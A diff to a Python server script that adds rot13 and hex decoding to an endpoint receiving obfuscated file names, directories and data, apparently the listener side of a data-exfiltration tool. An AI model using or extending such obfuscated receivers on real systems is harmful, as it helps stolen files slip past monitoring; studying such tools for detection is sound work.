@@ -12,6 +12,7 @@ import platform
 import urllib
 import time
 import socket
+import binascii 
 
 sistema = format(platform.system())
 
@@ -82,13 +83,20 @@ def receive_data():
 		json_data = request.get_json()
 		directory = json_data['dir']
 		nombre = json_data['name']
-		data = json_data['data']		
+		data = json_data['data']	
+		
+		data = rot13_decoder(data)
+		nombre = rot13_decoder(nombre)
+		directory = rot13_decoder(directory)
 
 		directory = directory[::-1]
 		directory = base64.b64decode(directory)
+		directory = binascii.unhexlify(directory)
 
 		nombre = nombre[::-1]
 		nombre = base64.b64decode(nombre)
+		nombre = binascii.unhexlify(nombre)
+		
 
 		destination = path + directory.decode()
 
@@ -109,8 +117,8 @@ def receive_data():
 
 
 		return "Data received OK!"
-	except:
-		pass
+	except Exception as e:
+		print (e)
 		return "KO"
 
 def udpserver():
@@ -178,7 +186,15 @@ def udpserver():
 		else:
 			totaldata = totaldata + data 
 
-
+def rot13_decoder(string):
+    # create a translation table
+    rot13 = str.maketrans(
+        "ABCDEFGHIJKLMabcdefghijklmNOPQRSTUVWXYZnopqrstuvwxyz",
+        "NOPQRSTUVWXYZnopqrstuvwxyzABCDEFGHIJKLMabcdefghijklm")
+        
+    return string.translate(rot13)
+    
+    
 
 if __name__ == '__main__':
 	try:
